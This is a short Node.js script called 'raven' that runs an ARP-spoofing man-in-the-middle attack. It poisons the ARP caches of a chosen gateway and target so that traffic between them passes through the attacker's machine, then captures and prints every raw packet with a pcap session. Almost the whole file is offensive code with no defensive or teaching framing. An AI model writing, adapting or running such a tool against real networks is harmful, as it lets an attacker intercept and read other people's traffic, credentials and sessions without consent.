#!/usr/bin/env node
// raven
// author Tristan Messner
const pcap = require("pcap2");
const arpjs = require("arpjs");
const fs = require("fs");
//check for all args
console.log(process.argv);
if(process.argv.length < 3 ){
   console.log("raven\nversion 1\nusage flock <gateway> <target> ");
   process.exit(1);
}
//check if user is root
if(process.getuid() != 0 ){
  console.log("run as root user not sudo");
}

function spoof(gateway,target){
    //tell gateway that I am the target
    arpjs.poison(gateway,target);
    //tell target that I am gateway
    arpjs.poison(target,gateway);

}

let timeout = setTimeout(function(){spoof(process.argv[2],process.argv[3]);},10000);
const pcapSession = new pcap.Session();

pcapSession.on('packet',function(rawPacket){
    console.log(rawPacket);
});
